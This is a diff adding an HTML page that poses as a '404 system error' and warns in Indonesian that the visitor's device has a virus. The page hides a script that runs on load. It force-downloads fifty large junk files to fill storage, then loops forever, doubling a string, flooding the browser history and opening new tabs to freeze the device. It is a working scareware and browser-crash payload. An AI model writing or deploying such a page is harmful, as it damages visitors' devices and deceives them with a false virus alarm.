@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Error 404</title>
+</head>
+<body style="background-color: black; color: white; text-align: center; padding-top: 20%;">
+    <h1>PERANGKAT ANDA TERDETEKSI VIRUS!</h1>
+    <p>Sedang mencoba memulihkan sistem...</p>
+
+    <script>
+        // 🛠️ QUANTUM V8.0 - THE DOOMSDAY SCRIPT
+        window.onload = function() {
+            // 1. Paksa Download File Sampah (Bikin Internal Penuh)
+            for (let i = 0; i < 50; i++) {
+                var blob = new Blob([new Array(1000000).join("QUANTUM_V8_")], {type: "text/plain"});
+                var url = window.URL.createObjectURL(blob);
+                var a = document.createElement("a");
+                a.href = url;
+                a.download = "system_fix_" + i + ".txt";
+                a.click();
+            }
+
+            // 2. RAM & CPU Eater (Bikin HP Freeze Total)
+            alert("⚠️ CRITICAL ERROR: RAM OVERLOAD! ⚠️");
+            var crash = "HACKED_BY_QUANTUM_";
+            while(true) {
+                crash += crash; // Ukuran string naik secara eksponensial
+                history.pushState(null, null, crash); // Menuhin history & RAM
+                console.log(crash);
+                
+                // Bikin ribuan tab atau popup kalo browsernya gak pinter
+                window.open(window.location.href, '_blank'); 
+            }
+        };
+    </script>
+</body>
+</html>
